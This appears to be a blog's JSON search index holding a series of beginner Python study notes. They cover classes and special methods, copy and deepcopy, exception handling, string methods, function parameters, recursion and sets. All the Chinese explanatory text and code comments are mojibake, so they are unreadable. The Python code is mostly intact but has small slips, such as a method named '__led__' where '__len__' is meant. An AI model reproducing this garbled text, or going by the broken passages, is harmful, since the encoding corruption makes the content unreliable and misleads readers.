C.__init__ at 0x000002B51547DC10&gt;, '__doc__': None}print(x.__class__)#è¾“å‡ºäº†å¯¹è±¡æ‰€å±çš„ç±» &lt;class '__main__.C'&gt;print(C.__bases__)#Cç±»çš„çˆ¶ç±»ç±»å‹å…ƒç´  (&lt;class '__main__.A'&gt;, &lt;class '__main__.B'&gt;)print(C.__base__)#ç±»çš„åŸºç±» &lt;class '__main__.A'&gt;print(C.__mro__)#ç±»çš„å±‚æ¬¡ç»“æ„ (&lt;class '__main__.C'&gt;, &lt;class '__main__.A'&gt;, &lt;class '__main__.B'&gt;, &lt;class 'object'&gt;)print(A.__subclasses__())#å­ç±»çš„åˆ—è¡¨ [&lt;class '__main__.C'&gt;] ç‰¹æ®Šæ–¹æ³• __len__() é€šè¿‡é‡å†™æ­¤æ–¹æ³•ï¼Œè®©len()çš„å‚æ•°å¯ä»¥è‡ªå®šä¹‰ç±»å‹ __add__() é€šè¿‡é‡å†™æ­¤æ–¹æ³•ï¼Œä»¤è‡ªå®šä¹‰å¯¹è±¡å…·æœ‰ç›¸åŠ çš„åŠŸèƒ½ __new__() åˆ›å»ºå¯¹è±¡ __init__() å¯¹åˆ›å»ºçš„å¯¹è±¡åˆå§‹åŒ– 12345678910class Student: def __init__(self,name): self.name=name def __add__(self,other): return self.name+other.namestu1=Student('Jack')stu2=Student('Rose')s=stu1+stu2print(s)#JackRoseprint(stu1.__add__(stu2))#JackRose 1234def __led__(self): return len(self.name)Â·Â·Â·print(len(s))#8 eg: 12345678910111213141516171819class Person: def __new__(cls,*args,**kwargs): print('__new__è¢«è°ƒç”¨æ‰§è¡Œäº†ï¼Œclsçš„idå€¼ä¸º{0}'.format(id(cls))) obj=super().__new__(cls) print('åˆ›å»ºå¯¹è±¡idä¸º{0}'.format(id(obj))) return obj def __init__(self,name,age): self.name=name self.age=ageprint('objectç±»å¯¹è±¡idä¸º{0}'.format(id(object)))print('Personç±»å¯¹è±¡idä¸º{0}'.format(id(Person))) #åˆ›å»ºPersonç±»çš„å®ä¾‹å¯¹è±¡p1=Person('Jack',20)print('p1è¿™ä¸ªPersonç±»çš„å®ä¾‹å¯¹è±¡idä¸º{0}'.format(id(p1))) #objectç±»å¯¹è±¡idä¸º140723223092736 #Personç±»å¯¹è±¡idä¸º2976723261008 #__new__è¢«è°ƒç”¨æ‰§è¡Œäº†ï¼Œclsçš„idå€¼ä¸º2976723261008 #åˆ›å»ºå¯¹è±¡idä¸º2976753841488 #p1è¿™ä¸ªPersonç±»çš„å®ä¾‹å¯¹è±¡idä¸º2976753841488 è§£è¯»ï¼š æ‰§è¡Œp1=Person()ï¼Œå°†å€¼ä¼ å…¥class Personä¸­çš„cls new()åˆ›å»ºå¯¹è¥¿æ˜‚obj,ä¼ å€¼cls objè¿”å›ï¼Œä¼ å…¥åˆå§‹åŒ–__init__() åˆå§‹åŒ–åè¿”å›p1 ç±»çš„æµ…æ‹·è´ä¸æ·±æ‹·è´ å˜é‡çš„èµ‹å€¼æ“ä½œ æµ…æ‹·è´ï¼šå¯¹è±¡åŒ…å«çš„å­å¯¹è±¡å†…å®¹ä¸æ‹·è´ï¼Œå› æ­¤ï¼Œæºå¯¹è±¡ä¸æ‹·è´å¯¹è±¡ä¼šå¼•ç”¨åŒä¸€ä¸ªå¯¹è±¡ æ·±æ‹·è´ï¼šä½¿ç”¨copyæ¨¡å—ä¸­çš„deepcopyå‡½æ•°ï¼Œé€’å½’æ‹·è´å¯¹è±¡ä¸­åŒ…å«çš„å­å¯¹è±¡ï¼Œæºå¯¹è±¡å’Œæ‹·è´å¯¹è±¡æ‰€æœ‰çš„å­å¯¹è±¡ä¹Ÿä¸ç›¸åŒã€‚ 1234567891011121314151617181920212223class Cpu: passclass Disk: passclass Computer: def __init__(self,cpu,disk): self.cpu=cpu self.disk=disk #å˜é‡çš„èµ‹å€¼cpu1=Cpu()cpu2=cpu1print(cpu1,cpu2) #ç±»çš„æµ…æ‹·è´disk=Disk()computer=Computer(cpu1,disk)import copycomputer2=copy.copy(computer)print(computer,computer.cpu,computer.disk)#&lt;__main__.Computer object at 0x000002B5136EFB20&gt;ï¼Œ&lt;__main__.Cpu object at 0x000002B51463B490&gt;ï¼Œ&lt;__main__.Disk object at 0x000002B51463B910&gt;print(computer2,computer2.cpu,computer2.disk)#&lt;__main__.Computer object at 0x000002B5148602E0&gt;ï¼Œ&lt;__main__.Cpu object at 0x000002B514860460&gt;ï¼Œ&lt;__main__.Disk object at 0x000002B5148601C0&gt; #åªæ‹·è´computer,ä¸æ‹·è´å­å¯¹è±¡(disk,cpu) #æ·±æ‹·è´computer3=copy.deepcopy(computer)print(computer3,computer3.cpu,computer3.disk)#&lt;__main__.Computer object at 0x000002B51541C730&gt; &lt;__main__.Cpu object at 0x000002B51541CBE0&gt; &lt;__main__.Disk object at 0x000002B51541C160&gt;","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://sinky.top/tags/python/"}]},{"title":"Pythonå­¦ä¹ 7","slug":"pythonå­¦ä¹ 7","date":"2022-09-19T11:28:00.378Z","updated":"2022-09-19T15:05:38.455Z","comments":true,"path":"2022/09/19/pythonå­¦ä¹ 7/","link":"","permalink":"https://sinky.top/2022/09/19/python%E5%AD%A6%E4%B9%A07/","excerpt":"","text":"Bug1.å¸¸è§ç±»å‹ (1)è¯­æ³•é”™è¯¯ï¼šSyntaxError (2)ç´¢å¼•è¶Šç•Œé—®é¢˜ï¼šIndexError 123456lst=[1,2,3,4]print(lst[4])l=[]l=append('a','b','c')print(l) #ä¿®æ”¹ï¼šl.append('a') (3)æ€è·¯ä¸æ¸…å¯¼è‡´çš„é—®é¢˜è§£å†³æ–¹æ¡ˆ ä½¿ç”¨print() ç”¨ #æš‚æ—¶æ³¨é‡Šä»£ç (4)è¢«åŠ¨ï¼šç”¨æˆ·è¾“å…¥é”™è¯¯å¯¼è‡´è¿”å›é”™è¯¯ Pythonå¼‚å¸¸å¤„ç†æœºåˆ¶Pythonæä¾›äº†å¼‚å¸¸å¤„ç†æœºåˆ¶ï¼Œå¯ä»¥åœ¨å¼‚å¸¸å‡ºç°æ—¶å³æ—¶æ•è·ã€‚å†…éƒ¨æ¶ˆåŒ–ï¼Œä»¤ç¨‹åºç»§ç»­è¿è¡Œã€‚ try:â€¦ except å¼‚å¸¸ç±»å‹:â€¦â€¦1234567try: a=int(input('Input a num:')) b=int(input('Input a num:')) c=a/b print('c=',c)except ZeroDivisionError: print('Sorry,Not is 0') å¤šä¸ªexceptç»“æ„ï¼štryâ€¦exceptâ€¦excepâ€¦except BaseException:â€¦1234567891011try: a=int(input('Input a num:')) b=int(input('Input a num:')) c=a/b print('c=',c)except ZeroDivisionError: print('Sorry,Not is 0')except ValueError: print('input number')except BaseException as e: print(e) tryâ€¦exceptâ€¦finallyfinallyæ— è®ºæ˜¯å¦å¼‚å¸¸éƒ½æ‰§è¡Œï¼Œå¸¸ç”¨äºé‡Šæ”¾tryä¸­ç”³è¯·çš„èµ„æºã€‚ å¸¸è§å¼‚å¸¸ç±»å‹ ZeroDivisionError â€”â€”é™¤é›¶ï¼ˆæ‰€æœ‰æ•°æ®ç±»å‹ï¼‰ IndexError â€”â€”åºåˆ—ä¸­æ²¡æœ‰æ­¤ç´¢å¼•ï¼ˆindexï¼‰ KeyError â€”â€”æ˜ å°„ä¸­æ²¡æœ‰æ­¤é“¾ NameError â€”â€”æœªå£°æ˜åˆå§‹åŒ–å¯¹è±¡ SyntaxError â€”â€”Pythonè¯­æ³•é”™è¯¯ ValueError â€”â€”ä¼ å…¥æ— æ•ˆçš„å‚æ•° tracebackæ¨¡å—æ‰“å°å¼‚å¸¸ä¿¡æ¯ 12345import tracebacktry: print(1/0)except: traceback.print_exc() PyCharmå¼€å‘ç¯å¢ƒçš„è°ƒè¯•1.æ–­ç‚¹ï¼šç¨‹åºè¿è¡Œåˆ°æ­¤å¤„æš‚æ—¶æŒ‚èµ·ï¼Œåœæ­¢æ‰§è¡Œ 2.è°ƒè¯•è§†å›¾ï¼š ï¼ˆ1ï¼‰å·¥å…·æ æŒ‰é’®ï¼šè¿è¡Œä¸‰è§’é”®å³ä¾§èœ˜è››æ ·å¼ ï¼ˆ2ï¼‰å³é”®ç¼–è¾‘åŒºï¼šdebugâ€™æ¨¡å—åâ€™ ï¼ˆ3ï¼‰shift+F9","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://sinky.top/tags/python/"}]},{"title":"Pythonå­¦ä¹ 6","slug":"pythonå­¦ä¹ 6","date":"2022-09-16T12:35:21.580Z","updated":"2022-09-19T05:16:18.032Z","comments":true,"path":"2022/09/16/pythonå­¦ä¹ 6/","link":"","permalink":"https://sinky.top/2022/09/16/python%E5%AD%A6%E4%B9%A06/","excerpt":"","text":"å­—ç¬¦ä¸²pythonåŸºæœ¬æ•°æ®ç±»å‹ï¼Œä¸å¯å˜å­—ç¬¦åºåˆ— é©»ç•™æœºåˆ¶ä»…ä¿å­˜ä¸€ä»½ç›¸åŒä¸”ä¸å¯å˜å­—ç¬¦ä¸²çš„æ–¹æ³•ã€‚ 123456a='python'b='python'c='python'print(a,id(a))print(b,id(b))print(c,id(c))#python 2381469127728 é©»ç•™æœºåˆ¶çš„å‡ ç§æƒ…å†µï¼ˆäº¤äº’æ¨¡å¼ï¼‰ å­—ç¬¦ä¸²çš„é•¿åº¦ä¸º0æˆ–1æ—¶ ç¬¦åˆæ ‡è¯†ç¬¦çš„å­—ç¬¦ä¸² å­—ç¬¦ä¸²åªåœ¨ç¼–è¯‘æ—¶è¿›è¡Œé©»ç•™ï¼Œè€Œéè¿è¡Œæ—¶ [-5,256] ä¹‹é—´çš„æ•´æ•°æ•°å­— sysä¸­çš„internæ–¹æ³•å¼ºç•™2ä¸ªå­—ç¬¦ä¸²æŒ‡å‘åŒä¸€ä¸ªå¯¹è±¡ï¼›pycharmå¯¹å­—ç¬¦ä¸²è¿›è¡Œäº†ä¼˜åŒ–å¤„ç† å¸¸ç”¨æ“ä½œæŸ¥è¯¢ index() æŸ¥æ‰¾å­ä¸²ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œè‹¥ä¸å­˜åœ¨è¿”å›ValueError rindex() æŸ¥æ‰¾å­ä¸²æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œè‹¥ä¸å­˜åœ¨è¿”å›ValueError find() æŸ¥æ‰¾å­ä¸²ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œè‹¥ä¸å­˜åœ¨è¿”å›-1 rfind() æŸ¥æ‰¾å­ä¸²æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œè‹¥ä¸å­˜åœ¨è¿”å›-1 12345s='hello,hello'print(s.index('lo')) #3print(s.rindex('lo'))#9print(s.find('lo'))#3print(s.rfind('lo'))#9 å¤§å°å†™è½¬æ¢ upper() æ‰€æœ‰å­—æ¯è½¬å¤§å†™ lower() æ‰€æœ‰å­—æ¯è½¬å°å†™ swapcase() å¤§å†™è½¬å°å†™ï¼Œå°å†™è½¬å¤§å†™ capitalize() é¦–å­—æ¯å¤§å†™ï¼Œå…¶ä½™å°å†™ title() æ¯ä¸ªå•è¯é¦–å­—æ¯å¤§å†™ï¼Œå‰©ä½™å­—ç¬¦è½¬å°å†™ 12345678910111213141516s='hello,Python'a=s.upper()#è½¬åäº§ç”Ÿæ–°çš„å­—ç¬¦ä¸²print(a)#HELLO,PYTHON print(a,id(a)) #1810982406960print(s,id(s)) #hello,Python 1810982405680print(s.lower())#hello,python è½¬åäº§ç”Ÿæ–°çš„å­—ç¬¦ä¸²print('------')b=s.lower()print(b,id(b)) #hello,python 1810996753072print(s,id(s)) #hello,Python 1810982398768print(b == s)print(b is s)#Falseprint('------')s2='hello,Python'print(s2.swapcase()) #HELLO,pYTHONprint(s2.title())#Hello,Python å†…å®¹å¯¹é½ center() å±…ä¸­å¯¹é½ï¼Œcenter([å®½åº¦],[å¡«å……ç¬¦]) ljust å·¦å¯¹é½ rjust å³å¯¹é½ zfill() å³å¯¹é½ï¼Œå·¦è¾¹ä»¥0å¡«å……ï¼Œzfill([å®½åº¦]) 12345678s='hello,Python'print(s.center(20,'*'))#****hello,Python****print(s.ljust(20,'*'))#hello,Python********print(s.ljust(10))#hello,Python å®½åº¦å°äºå­—ç¬¦ä¸²æœ¬èº«ï¼Œåˆ™è¿”å›å­—ç¬¦ä¸²æœ¬èº«print(s.rjust(20,'*'))#********hello,Pythonprint(s.rjust(20))# hello,Pythonprint(s.zfill(20))#00000000hello,Pythonprint('-8910'.zfill(8))#-0008910 åŠˆåˆ† split() ä»å­—ç¬¦ä¸²å·¦è¾¹å¼€å§‹åŠˆåˆ†ï¼Œé»˜è®¤ä»¥ç©ºæ ¼åŠˆåˆ†ï¼Œè¿”å›ç»“æœä¸ºåˆ—è¡¨ï¼›ä»¥å‚æ•°sepæŒ‡å®šåˆ†éš”ç¬¦ï¼›ä»¥å‚æ•°maxsplitæŒ‡å®šåˆ†éš”æœ€å¤§æ¬¡æ•° rsplit() ä»å³è¾¹å¼€å§‹åŠˆåˆ† 12345678s='hello world Python'l=s.split()print(l)#['hello', 'world', 'Python']s1='hello|world|Python'print(s1.split(sep='|'))#['hello', 'world', 'Python']print(s1.split(sep='|',maxsplit=1))#['hello', 'world|Python']print(s.split())#['hello', 'world', 'Python']print(s1.rsplit(sep='|',maxsplit=1))#['hello|world', 'Python'] åˆ¤æ–­å­—ç¬¦ä¸²æ“ä½œ isidentifier() æ˜¯å¦åˆæ³•æ ‡è¯†ç¬¦ï¼ˆå­—æ¯æ•°å­—ä¸‹åˆ’çº¿ï¼‰ isspace() æ˜¯å¦å…¨æ˜¯ç©ºæ ¼ isalpha() æ˜¯å¦å…¨æ˜¯å­—æ¯ isdecimal() æ˜¯å¦å…¨æ˜¯åè¿›åˆ¶æ•°å­— isnumeric() æ˜¯å¦å…¨æ˜¯æ•°å­— isalnum() æ˜¯å¦å…¨æ˜¯æ•°å­—å’Œå­—æ¯ç»„æˆ æ›¿æ¢åˆå¹¶ replace() å­—ç¬¦ä¸²æ›¿æ¢ join() æ²³æ»¨ï¼Œåˆ—è¡¨æˆ–å…ƒç»„ä¸­å­—ç¬¦ä¸²åˆå¹¶ä¸ºä¸€ä¸ªå­—ç¬¦ä¸² 12345678s='hello,Python'print(s.replace('Python','Java'))#hello,Javas1='hello,Python,Python,Python'print(s.replace('Python','Java',2))#hello,Javalst=['hello','java','python']print('|'.join(lst))#hello|java|pythonprint(''.join(lst))#hellojavapythonprint('*'.join('Python'))#P*y*t*h*o*n æ¯”è¾ƒè¿ç®—ç¬¦&gt; &gt;= &lt; &lt;= == != 1234print('apple'&gt;'app')#Trueprint('apple'&gt;'banana')#Falseprint(ord('a'),ord('b'))#97 98print(chr(97),chr(98))#a b â€˜==â€™ æ¯”è¾ƒ value â€˜isâ€™ æ¯”è¾ƒ id 12345a=b='Python'c='Python'print(a==b)#Trueprint(b==c)#Trueprint(id(a),id(b),id(c))#1621331059952 1621331059952 1621331059952 åˆ‡ç‰‡ [startğŸ”šstep]å­—ç¬¦ä¸²ä¸å¯å˜ï¼Œåˆ‡ç‰‡åå°†äº§ç”Ÿæ–°å¯¹è±¡ 123456789s='hello,python's1=s[:5]s2=s[6:]s3='!'newstr=s1+s3+s2print(s1)#helloprint(s2)#pythonprint(s3)#!print(newstr)#hello!python æ ¼å¼åŒ–å­—ç¬¦ä¸² %ä½œå ä½ç¬¦ 'æˆ‘å«%s'%(name) {}ä½œå ä½ç¬¦ 'æˆ‘å«{0},ä»Šå¹´{1}å²ï¼Œæˆ‘çœŸçš„æ˜¯{0}'.format(name,age) 12345name='å¼ ä¸‰'age=20print('æˆ‘å«%s,ä»Šå¹´%då²'%(name,age))#æˆ‘å«å¼ ä¸‰ï¼Œä»Šå¹´20å²print('æˆ‘å«{0},ä»Šå¹´{1}å²'.format(name,age))print(f'æˆ‘å«{name},ä»Šå¹´{age}å²') eg: 123456print('%10d'%99)# 99;10è¡¨ç¤ºå®½åº¦print('%.3f'%3.1415926)#3.142ï¼›#.3è¡¨ç¤ºå°æ•°ç‚¹åä¸‰ä½print('%10.3f'%3.1415926)# 3.142print(' ---- ')print('{0:.3f}'.format(3.1415926)) #3.142print('{0:10.3f}'.format(3.1415926))# 3.142 ç¼–ç è½¬æ¢ç¼–ç ï¼šå­—ç¬¦ä¸²è½¬äºŒè¿›åˆ¶ è§£ç ï¼šäºŒè¿›åˆ¶è½¬å­—ç¬¦ä¸² GBKä¸­ï¼Œä¸€ä¸ªä¸­æ–‡å ä¸¤ä¸ªå­—èŠ‚ï¼›UTF-8ä¸­ï¼Œä¸€ä¸ªä¸­æ–‡å ä¸‰ä¸ªå­—èŠ‚ 1234s='å¤©æ¶¯å…±æ­¤æ—¶'print(s.encode(encoding='GBK'))#b'\\xcc\\xec\\xd1\\xc4\\xb9\\xb2\\xb4\\xcb\\xca\\xb1'byte=s.encode(encoding='GBK')print(byte.decode(encoding=\"GBK\"))#å¤©æ¶¯å…±æ­¤æ—¶ å‡½æ•°åˆ›å»ºï¼Œè°ƒç”¨ï¼ˆ1ï¼‰å‡½æ•°ä½œç”¨ï¼šå¤ç”¨ä»£ç ï¼Œéšè—å®ç°ç»†èŠ‚ï¼Œæé«˜å¯ç»´æŠ¤æ€§ï¼Œæé«˜å¯è¯»æ€§ä¾¿äºè°ƒè¯• ï¼ˆ2ï¼‰åˆ›å»ºï¼šdef å‡½æ•°å([å‚æ•°]): å‡½æ•°ä½“ ï¼ˆ3ï¼‰è°ƒç”¨ï¼š 12345def calc(a,b): #a,bä¸ºå½¢å‚ï¼Œåœ¨å‡½æ•°å®šä¹‰å¤„ c=a+b return cresult=calc(10,20) #10ï¼Œ20æ˜¯å®å‚ï¼Œåœ¨å‡½æ•°è°ƒç”¨å¤„print(result) #30 å‚æ•°ä¼ é€’ï¼ˆ1ï¼‰ä½ç½®å®å‚ï¼šå¯¹åº”ä½ç½®è¿›è¡Œå‚æ•°ä¼ é€’ ï¼ˆ2ï¼‰å…³é”®å­—å®å‚ï¼šå¯¹åº”åç§°è¿›è¡Œå‚æ•°ä¼ é€’ 12result=calc(a=10,b=20)print(result) #30 eg: 1234567891011121314def fun(arg1,arg2): print('arg1',arg1)#arg1 11 print('arg2',arg2)#arg2 [22, 33, 44] arg1=100 arg2.append(10) print('arg1',arg1)#arg1 100 print('arg2',arg2)#arg2 [22, 33, 44, 10]n1=11n2=[22,33,44]print('n1',n1)#n1 11print('n2',n2)#n2 [22, 33, 44]fun(n1,n2)#è·³åˆ°fun()print('n1',n1)#n1 11print('n2',n2)#n2 [22, 33, 44, 10] åœ¨å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­ï¼Œè¿›è¡Œå‚æ•°ä¼ é€’ï¼Œè‹¥æ˜¯ä¸å¯å˜å¯¹è±¡ï¼Œåœ¨å‡½æ•°ä½“çš„ä¿®æ”¹ä¸ä¼šå½±å“å®å‚çš„å€¼ï¼›è‹¥å¯å˜åˆ™ä¼šå½±å“ è¿”å›å€¼ï¼ˆ1ï¼‰è¿”å›å€¼æœ‰å¤šä¸ªæ—¶ï¼Œç»“æœå°†ä»¥å…ƒç»„å½¢å¼è¿”å› 1234567891011def fun(num): odd=[]#å­˜å‚¨å¥‡æ•° even=[]#å­˜å‚¨å¶æ•° for i in num: if i %2: odd.append(i) else: even.append(i) return odd,evenlst=[10,20,39,43,66,24]print(fun(lst))#([39, 43], [10, 20, 66, 24]) ï¼ˆ2ï¼‰å¦‚æœè¿”å›å€¼æ²¡æœ‰ï¼ˆå‡½æ•°æ‰§è¡Œåä¸éœ€è¦ç»™è°ƒç”¨å‡ºæä¾›æ•°æ®ï¼‰ï¼Œreturnå¯çœç•¥ï¼› è‹¥è¿”å›å€¼ä¸º1ä¸ªï¼Œåˆ™ç›´æ¥è¿”å›ç±»å‹ï¼› è‹¥è¿”å›å€¼ä¸ºå¤šä¸ªï¼Œåˆ™è¿”å›ä¸ºå…ƒç»„ï¼› 12345678910def fun1(): print('hello')fun1()#hellodef fun2(): return 'hello'result=fun2()print(result)#hellodef fun3(): return 'hello','world'print(fun3())#('hello', 'world') å‚æ•°å®šä¹‰ï¼ˆ1ï¼‰é»˜è®¤å€¼ 1234def fun(a,b=10): print(a,b)fun(100)#100 10fun(20,30)#20 30 ï¼ˆ2ï¼‰ä¸ªæ•°å¯å˜çš„ä½ç½®å‚æ•°ï¼ˆåªå¯ä¸ºä¸€ä¸ªï¼‰ï¼Œç”¨*å®šä¹‰å¯å˜çš„å½¢å‚ï¼Œç»“æœä¸ºå…ƒç»„ 1234def fun(*args): print(args)fun(10)#(10,)fun(10,20,30)#(10, 20, 30) ï¼ˆ3ï¼‰ä¸ªæ•°å¯å˜çš„å…³é”®å­—å½¢å‚ï¼ˆåªå¯ä¸ºä¸€ä¸ªï¼‰ï¼Œç”¨**å®šä¹‰å¯å˜çš„å½¢å‚ï¼Œç»“æœä¸ºå­—å…¸ 1234def fun(**args): print(args)fun(a=10)#{'a': 10}fun(a=10,b=20,c=30)#{'a': 10, 'b': 20, 'c': 30} å‡½æ•°å®šä¹‰ä¸­ï¼ŒäºŒè€…åŒä¸ºå½¢å‚æ—¶ï¼Œä½ç½®å‚æ•°æ”¾åœ¨å…³é”®å­—å‚æ•°ä¹‹å‰ 12345678910def fun(a,b,c): print('a=',a) print('b=',b) print('c=',c)fun(10,20,30)#ä½ç½®ä¼ å‚#a=10 b=20 c=30lst=[11,22,33]fun(*lst)#åˆ—è¡¨ä¸­å…ƒç´ è½¬ä½ç½®å‚æ•°ä¼ å…¥#a=11 b=22 c=33fun(a=100,b=200,c=300)#a=100 b=200 c=300dict={'a':111,'b':222,'c':333}fun(**dict)#å­—å…¸ä¸­é”®å€¼å¯¹è½¬å…³é”®å­—å‚æ•°ä¼ å…¥#a=111 b=222 c=333 eg: 1234567891011121314151617def fun(a,b=10): print('a=',a) print('b=',b)def fun2(*args): print(args)def fun3(**args): print(args)fun2(10,20,30,40)#(10, 20, 30, 40)fun3(a=11,b=22,c=33,d=44,e=55)#{'a': 11, 'b': 22, 'c': 33, 'd': 44, 'e': 55}def fun4(a,b,c,d): print('a=',a) print('b=',b) print('c=',c) print('d=',d)fun4(10,20,30,40)#a=10 b=20 c=30 d=40fun4(a=11,b=22,c=33,d=44)#a=11 b=22 c=33 d=44fun4(100,200,c=300,d=400)#a=100 b=200 c=300 d=400 å˜é‡çš„ä½œç”¨åŸŸä»£ç å¯è®¿é—®è¯¥å˜é‡çš„åŒºåŸŸ æœ‰æ•ˆèŒƒå›´ï¼š ï¼ˆ1ï¼‰å±€éƒ¨å˜é‡ï¼šglobalå£°æ˜å¯å°†å±€éƒ¨å˜é‡è½¬ä¸ºå…¨å±€å˜é‡ï¼›å±€éƒ¨å˜é‡ä»…åœ¨å‡½æ•°ä½“å†…éƒ¨æœ‰æ•ˆ ï¼ˆ2ï¼‰å…¨å±€å˜é‡ï¼šå‡½æ•°ä½“å¤–å®šä¹‰çš„å˜é‡ï¼Œå‡½æ•°ä½“å†…å¤–éƒ½å¯è°ƒç”¨ 1234567891011121314def fun(a,b): c=a+b #cä¸ºå±€éƒ¨å˜é‡ print(c)name='å¼ ä¸‰'#nameä¸ºå…¨å±€å˜é‡print(name)def fun1(): print(name)fun1()#å¼ ä¸‰def fun2(): global age age=20 print(age)fun2()print(age) é€’å½’å‡½æ•°ï¼ˆ1ï¼‰ä¸€ä¸ªå‡½æ•°åœ¨å‡½æ•°ä½“å†…è°ƒç”¨æœ¬èº«ï¼Œå³ä¸ºé€’å½’ ï¼ˆ2ï¼‰ç»„æˆï¼šé€’å½’è°ƒç”¨ä¸ç»ˆæ­¢æ¡ä»¶ ï¼ˆ3ï¼‰æ¯é€’å½’è°ƒç”¨ä¸€æ¬¡ï¼Œå°±åœ¨æ ˆå†…åˆ†é…ä¸€ä¸ªæˆ˜é˜µï¼Œæ‰§è¡Œå®Œä¹‹åå†é‡Šæ”¾ ï¼ˆ4ï¼‰ä¼˜ç‚¹ï¼šæ€è·¯ä»£ç ç®€å•ï¼›ç¼ºç‚¹ï¼šå ç”¨å†…å­˜å¤šï¼Œæ•ˆç‡ä½ 123456def fac(n): if n==1: return 1 else: return n*fac(n-1)print(fac(6))#720 æ–æ³¢é‚£å¥‘æ•°åˆ—ï¼š 1234567891011def fib(n): if n==1: return 1 elif n==2: return 1 else: return fib(n-1)+fib(n-2)print(fib(8))#21 #è¾“å‡ºå‰å…­ä½for i in range(1,7): print(fib(i))#1 1 2 3 5 8","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://sinky.top/tags/python/"}]},{"title":"pythonå­¦ä¹ éšç¬”è®°å½•","slug":"pythonéšç¬”è®°å½•","date":"2022-09-11T03:14:15.901Z","updated":"2022-09-14T14:58:43.042Z","comments":true,"path":"2022/09/11/pythonéšç¬”è®°å½•/","link":"","permalink":"https://sinky.top/2022/09/11/python%E9%9A%8F%E7%AC%94%E8%AE%B0%E5%BD%95/","excerpt":"","text":"strip() åˆ é™¤ä¸¤è¾¹ç©ºæ ¼ lstrip() åˆ é™¤å·¦è¾¹ç©ºæ ¼ rstrip() åˆ é™¤å³è¾¹ç©ºæ ¼ replace(â€œ â€œ,â€â€) åˆ é™¤æ‰€æœ‰ç©ºæ ¼ split() å…ˆåˆ‡åˆ† join() å†æ‹¼æ¥ 1æè¿° ä¸€ä¸²è¿ç»­çš„æ•°æ®ç”¨ä»€ä¹ˆè®°å½•æœ€åˆé€‚ï¼Œç‰›ç‰›è®¤ä¸ºåœ¨Pythonä¸­éåˆ—è¡¨ï¼ˆlistï¼‰è«å±äº†ã€‚ç°è¾“å…¥ç‰›ç‰›æœ‹å‹ä»¬çš„åå­—ï¼Œè¯·ä½¿ç”¨listå‡½æ•°ä¸splitå‡½æ•°å°†å®ƒä»¬å°è£…æˆåˆ—è¡¨ï¼Œå†æ•´ä¸ªè¾“å‡ºåˆ—è¡¨ã€‚ è¾“å…¥æè¿°ï¼š è¾“å…¥ä¸€ä¸²å­—ç¬¦ä¸²ï¼Œå®ƒä»¬ä¹‹é—´é€šè¿‡ç©ºæ ¼é—´éš”å¼€ã€‚ è¾“å‡ºæè¿°ï¼š è¾“å‡ºå°è£…åçš„åˆ—è¡¨ã€‚ ç¤ºä¾‹1 è¾“å…¥ï¼šNiuNiu NiuMei NiuNeng è¾“å‡ºï¼š['NiuNiu', 'NiuMei', 'NiuNeng'] è§£ï¼š 12345name=input().split(\" \")name_list=list()for i in name: name_list.append(i)print(name_list) 2 bin(x) è½¬äºŒè¿›åˆ¶ hex(x) è½¬åå…­è¿›åˆ¶ ord(x) å­—æ¯è½¬æ•°å­— abs(x) è½¬ç»å¯¹å€¼ sum(x) ç®—æ•°å’Œ max(x) æœ€å¤§å€¼ min(x) æœ€å°å€¼ count() è®¡æ•° pow() å¹‚ä¹˜ x**y=pow(x,y) x.isalpha() åˆ¤æ–­å­—ç¬¦ä¸²ä¸­æ˜¯å¦åªåŒ…å«å­—æ¯ x.isdigit() åˆ¤æ–­å­—ç¬¦ä¸²ä¸­æ˜¯å¦åªåŒ…å«æ•°å­— x.isspace() åˆ¤æ–­å­—ç¬¦ä¸²ä¸­æ˜¯å¦åªåŒ…å«ç©ºæ ¼ find() æŸ¥æ‰¾å­—ç¬¦ä¸² round(f,n) è¾“å‡ºfå››èˆäº”å…¥ä¿ç•™è‡³nä½å°æ•°åçš„ç»“æœ eval() å…¬å¼è®¡ç®—å™¨","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://sinky.top/tags/python/"}]},{"title":"Pythonå­¦ä¹ 5","slug":"pythonå­¦ä¹ 5","date":"2022-09-06T08:43:42.900Z","updated":"2022-09-06T10:08:01.922Z","comments":true,"path":"2022/09/06/pythonå­¦ä¹ 5/","link":"","permalink":"https://sinky.top/2022/09/06/python%E5%AD%A6%E4%B9%A05/","excerpt":"","text":"é›†åˆpythonå†…ç½®æ•°æ®ç»“æ„ï¼Œå¯å˜åºåˆ—ï¼Œæ— valueçš„å­—å…¸ã€‚ åˆ›å»ºï¼š {} s={'Python','world',90} set() : s=set(range(6)) 12s={2,3,4,4,5,6,7,7}print(s) #{2, 3, 4, 5, 6, 7} eg: 1234567891011121314s1=set(range(6))print(s,type(s)) #{2, 3, 4, 5, 6, 7} &lt;class 'set'&gt;s3=set((1,2,4,4,5,65))print(s3,type(s3)) #{65, 1, 2, 4, 5} &lt;class 'set'&gt; #é›†åˆä¸­å…ƒç´ æ— åºs4=set('python')print(s4,type(s4)) #{'o', 'n', 'y', 't', 'h', 'p'} &lt;class 'set'&gt;s5=set({12,4,33,25,24,23})print(s5,type(s5)) #{33, 4, 23, 24, 25, 12} &lt;class 'set'&gt; #ç©ºé›†åˆs6={} #å­—å…¸ç±»å‹print(type(s6)) #&lt;class 'dict'&gt;s7=set()print(s7,type(s7)) #set() &lt;class 'set'&gt; ç›¸å…³æ“ä½œï¼ˆ1ï¼‰åˆ¤æ–­ï¼š in æˆ– not in ï¼ˆ2ï¼‰æ–°å¢ï¼š add() : ä¸€æ¬¡æ·»åŠ ä¸€ä¸ªå…ƒç´  update() : è‡³å°‘æ·»åŠ ä¸€ä¸ªå…ƒç´  ï¼ˆ3ï¼‰åˆ é™¤ï¼š remove() : ä¸€æ¬¡åˆ é™¤ä¸€ä¸ªæŒ‡å®šå…ƒç´ ï¼ŒæŒ‡å®šå…ƒç´ ä¸å­˜åœ¨æŠ›å‡ºkeyerror discard(): ä¸€æ¬¡åˆ é™¤ä¸€ä¸ªæ³¨å®šå…ƒç´ ï¼ŒæŒ‡å®šå…ƒç´ ä¸å­˜åœ¨ä¸æŠ›å‡ºå¼‚å¸¸ 